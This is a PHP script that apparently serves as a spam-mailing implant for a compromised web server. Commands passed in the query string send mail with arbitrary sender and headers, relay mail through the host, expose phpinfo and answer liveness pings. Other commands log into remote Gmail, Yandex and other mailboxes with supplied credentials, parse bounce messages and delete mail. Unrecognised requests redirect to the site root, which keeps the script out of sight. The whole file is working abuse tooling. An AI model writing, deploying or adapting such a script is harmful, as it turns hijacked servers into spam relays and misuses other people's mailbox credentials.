<?php
$imap_error='';
$magic='';
$data = '';
$has_mbstring = 0;
$finish_time=time()+50;

switch ($_SERVER['QUERY_STRING']) {
case 'send':
	send_by_redirect();	
	break;
case 'ping':
	ping();
	break;
case 'send22':
	send_message();
	break;
case 'imap':
	check_imap();
	break;
case 'phpinfo':
	phpinfo();
	break;
case 'check_box':
	check_box();
	break;
case 'show_folders':
	show_folders();
	break;
case 'check_gs_box':
	check_gs_box();
	break;
case 'clean_box':
	clean_box();
	break;
default:
	header('Location: /');
}

function get_params() {
	$names = func_get_arg(0);
	if (!is_array($names)) {
		$names = func_get_args();
	}

	$result = array();

	if (get_magic_quotes_gpc()) {
		foreach ($names as $name) {
			$result[] = @stripslashes($_POST[$name]);
		}
	}
	else {
		foreach ($names as $name) {
			$result[] = @$_POST[$name];
		}
	}

	return $result;
}

function _mail ($to, $subj, $what, $from, $reply, $headers)
{
	global $has_mbstring;
	
	if($has_mbstring){
	    $subj  = mime_header_encode($subj, 'UTF-8', 'CP1251');
		$what = iconv('UTF-8', 'CP1251', $what);
		
		$headers = "From: $reply <$from>\r\nContent-type: text/plain; charset=CP1251\r\n";
		
		return mail($to, $subj, $what, $headers);
	}
	else{
		if(!$headers){
			$headers = "From: $reply <$from>\r\nContent-Transfer-Encoding: 8bit\r\n";
		}
		
		return mail($to, $subj, $what, $headers);
	}
}

function ping() {	
	$ping = 'ping OK'.$magic;
	header('Content-Length: '.strlen($ping));
	echo $ping;
}

function mime_header_encode($str, $data_charset, $send_charset) {
  if($data_charset != $send_charset) {
    $str = iconv($data_charset, $send_charset, $str);
  }
  return '=?' . $send_charset . '?B?' . base64_encode($str) . '?=';
}

function check_imap () {
	if (function_exists('imap_open')) {
		$imap="IMAP YES";
	} else {
		$imap="IMAP NO";
	}
	header('Content-Length: '.strlen($imap));
	echo $imap;
}

function send_message() {
	global $data;
	global $has_mbstring;
	
	list ($from_name, $from_email, $to, $subject, $headers, $body, $debug, $mb) = get_params('from_name','from_email', 'to', 'subject', 'headers', 'body','debug','mb');
	
	$has_mbstring = $mb;
	
	if($debug){
		error_reporting(65535);
	}
	
	if (!($to && $from_email && $subject && $body)) {
		$fail='SEND_FAIL'.$magic;
		header('Content-Length: '.strlen($fail));
		echo $fail;
		return;
	}

	$isok = _mail($to, $subject, $body, $from_name, $from_email, $headers);
	if ($isok){
		$OK='SEND_OK'.$magic;
		header('Content-Length: '.strlen($OK));
		echo $OK;
	} else {
                $fail='SEND_FAIL'.$magic;
		header('Content-Length: '.strlen($fail));
		echo $fail;
        }
}

function send_by_redirect(){
	global $data;
	
	$host = $_SERVER['HTTP_HOST'];
	$port = $_SERVER['SERVER_PORT'];
	$path = $_SERVER['SCRIPT_NAME'];
	
	if( !$fp = fsockopen($host, $port, $errno, $errstr, 30) ) {		
		$data = "$host:$port:$path FAIL SOCK OPENED";
		echo_exit();
	}
	
	list ($from_name, $from_email, $to, $subject, $headers, $body,$debug,$mb) = get_params('from_name','from_email', 'to', 'subject', 'headers', 'body','debug','mb');
	
	$data = "mb=".urlencode($mb)."&from_name=".urlencode($from_name)."&from_email=".urlencode($from_email)."&to=".urlencode($to)."&subject=".urlencode($subject)."&headers=".urlencode($headers)."&body=".urlencode($body)."&debug=".urlencode($debug);
	$length = strlen($data);		
	
	$ps = explode('/', $path);
	for($i=0;$i<count($ps);$i++) {$ps[$i] = rawurlencode($ps[$i]);}
	$path = implode('/',$ps);
	
	$request =
	"POST $path?send22 HTTP/1.0\r\n".
	"Host: $host\r\n".
	"Content-Type: application/x-www-form-urlencoded\r\n".
	"Content-Length: $length\r\n".
	"Connection: close\r\n".
	"\r\n".$data;
	
	fputs($fp, $request);
	
	$server_response = '';
	while (!feof($fp)) {
        $server_response .= fgets ($fp,512);
    }
	fclose($fp);
		
	$answer = explode("\r\n\r\n", $server_response);
	$data = $answer[1];
	
	echo_exit();
}

function echo_exit(){
	global $data;
	header('Content-Length: '.strlen($data));
	echo $data;
	exit;
}

function check_box() {
	list ($email,$password,$purge) = get_params('email','password','purge');
	header('Content-Type: text/plain; charset=utf8');
	if (!imap_messages($email,$password,$purge)) {
		global $imap_error;
		echo "ERROR:$imap_error\n";
	}
}

function show_folders() {
	list ($email,$password) = get_params('email','password');
	header('Content-Type: text/plain; charset=utf8');
	$imap=imap_email_open($email,$password);
	foreach ($imap['all_folders'] as $folder) {
		$imap_stream=$imap['stream'];
		imap_reopen($imap_stream,$folder);
		$MN=imap_num_msg($imap_stream);
		echo "$folder:$MN\n";
	}
	echo "====FILTERED=====\n";
	foreach ($imap['boxes'] as $mbox) {
		$imap_stream=$imap['stream'];
		imap_reopen($imap_stream,$mbox);
		$MN=imap_num_msg($imap_stream);
		echo "$mbox:$MN\n";
	}
}

function check_gs_box() {
	list ($email,$password) = get_params('email','password');
	header('Content-Type: text/plain; charset=utf8');
	if (!gs_messages($email,$password)) {
		global $imap_error;
		echo "ERROR:$imap_error\n";
	}
}

function clean_box() {
	list ($email,$password,$clean) = get_params('email','password','clean');
	header('Content-Type: text/plain; charset=utf8');
	if (!imap_clean_boxes($email,$password,$clean)) {
		global $imap_error;
		echo "ERROR:$imap_error\n";
	}
}

function is_mdelivery($header) {
	return 
	preg_match("/fail.*not|Undelivered Mail Returned|Mail delivery failed/",$header->subject) or
	preg_match("/MAILER-DAEMON|Mail Delivery System/",$header->from);
}

function is_md550($body) {
	return
	strrpos($body, "The following addresses failed")!==FALSE or 
	strrpos($body, "has no ip address")!==FALSE or 
	strrpos($body, "551 not our customer")!==FALSE or 
	strrpos($body, "554 delivery")!==FALSE or 
	strrpos($body, "550 ")!==FALSE;
}

function gs_box_messages($imap,$mbox,$folder) {
	$imap_stream=$imap['stream'];
	imap_reopen($imap_stream,$mbox);
	$MN=imap_num_msg($imap_stream);
	$continue=$MN>100;
	if ($continue) $MN=100;
	if ($MN<=0) return;
	echo "$folder\n";
	$result = imap_fetch_overview($imap_stream,"1:$MN",0);
	foreach ($result as $header) {
		//$header->subject=decode($header->subject);
		$mdelivery=is_mdelivery($header);
		$message_id=$header->message_id;
		if ($mdelivery) {
			// fetch body and find Message-ID of original letter
			$body=imap_body($imap_stream,$header->msgno);
			if (
			preg_match('/Message-ID:\s*<(\S+)>/s',$body,$matches) ||
			preg_match('/Message-ID:\s*(\S+)/s',$body,$matches)
			) {						
				$message_id=$matches[1];
			}
			if (is_md550($body)) {$mdelivery=-1;}
			echo join(";",array($header->msgno,$mdelivery,$message_id))."\n";
			imap_delete($imap_stream,$header->msgno);
		}
		global $finish_time;
		if (time()>$finish_time) {
			$continue=1;
			break;
		}
	}
	if ($continue) echo "!CONTINUE!\n";
	if ($purge) imap_expunge($imap['stream']);
}

function box_messages($imap,$mbox,$folder,$purge) {
	$imap_stream=$imap['stream'];
	imap_reopen($imap_stream,$mbox);
	$MN=imap_num_msg($imap_stream);
	$continue=$MN>30;
	if ($continue) $MN=30;
	if ($MN<=0) return;
	echo "$folder\n";
	$result = imap_fetch_overview($imap_stream,"1:$MN",0);
	foreach ($result as $header) {
		//$header->subject=decode($header->subject);
		$mdelivery=is_mdelivery($header);
		$message_id=$header->message_id;
		if ($mdelivery) {
			// fetch body and find Message-ID of original letter
			$body=imap_body($imap_stream,$header->msgno);
			if (
			preg_match('/Message-ID:\s*<(\S+)>/s',$body,$matches) ||
			preg_match('/Message-ID:\s*(\S+)/s',$body,$matches)
			) {						
				$message_id=$matches[1];
			}
			if (is_md550($body)) {$mdelivery=-1;}
		}
		echo join(";",array($header->msgno,$mdelivery,$message_id))."\n";
		if ($purge) imap_delete($imap_stream,$header->msgno);
		global $finish_time;
		if (time()>$finish_time) {
			$continue=0;
			echo "!CONTINUE!\n";
			break;
		}
	}
	if ($continue) echo "!CONTINUE!\n";
	if ($purge) imap_expunge($imap['stream']);
}

function imap_email_open($email,$password) {
	$dsyn['googlemail.com']='gmail.com';
	$imap['gmail.com']="{imap.gmail.com:993/imap/ssl/novalidate-cert}";
	$imap['yandex.ru']='{imap.yandex.ru:143/imap/notls}';
	global $imap_error;
	if (!preg_match("/\@(.*)/", $email, $matches)) { 
		$imap_error='invalid email';
		return false;
	}
	$domain=$matches[1];
	$domain=array_key_exists($domain,$dsyn)?$dsyn[$domain]:$domain;
	if (array_key_exists($domain,$imap)) { 
		$imap_server=$imap[$domain];
	} else { # let's try default construction		
		$imap_server="{imap.$domain:143/imap/notls/novalidate-cert}";
	}
	$imap_stream=imap_open($imap_server,$email,$password);
	if (!$imap_stream) {
		$imap_error=imap_last_error();
		return false;
	}
	$folders=imap_list($imap_stream, $imap_server, "*");
	//echo "All folders:\n";print_r($folders);
	$list = preg_grep('/INBOX|BCEEPwQwBDw|Spam/i',$folders);//inbox || spam	
	$boxes=array();
	if (is_array($list)) {
		foreach ($list as $mbox) {
			$folder=substr($mbox,strlen($imap_server));
			$boxes[$folder]=$mbox;
		}
	}
	return array('stream'=>$imap_stream,'server'=>$imap_server,'boxes'=>$boxes,'all_folders'=>$folders);
}

function gs_messages($email,$password) {
	$imap=imap_email_open($email,$password);
	if (!$imap) return false;
	$boxes=$imap['boxes'];
	foreach ($boxes as $folder=>$mbox) {
		gs_box_messages($imap,$mbox,$folder);
		global $finish_time;
		if (time()>$finish_time) break;
	}
	imap_expunge($imap['stream']);
	imap_close($imap['stream'],CL_EXPUNGE);
	return true;
}

function imap_messages($email,$password,$purge) {
	$imap=imap_email_open($email,$password);
	if (!$imap) return false;
	$boxes=$imap['boxes'];
	foreach ($boxes as $folder=>$mbox) {
		box_messages($imap,$mbox,$folder,$purge);
		global $finish_time;
		if (time()>$finish_time) break;
	}
	imap_expunge($imap['stream']);
	imap_close($imap['stream'],CL_EXPUNGE);
	return true;
}

function imap_clean_boxes($email,$password,$box_messages_to_delete) {
	$box_messages_to_delete=explode(";",$box_messages_to_delete);
	$imap=imap_email_open($email,$password);
	if (!$imap) return false;
	$boxes=$imap['boxes'];
	$imap_stream=$imap['stream'];
	foreach ($box_messages_to_delete as $box_messages) {
		list($box,$messages)=explode(':',$box_messages);
		echo "$box\n";
		imap_reopen($imap_stream,$boxes[$box]);
		$messages=explode(',',$messages);
		foreach ($messages as $msgno) {
			if (imap_delete($imap['stream'],$msgno)) {
				echo "$msgno\n";
			}
		}
	}
	imap_close($imap['stream'],CL_EXPUNGE);
	return true;
}
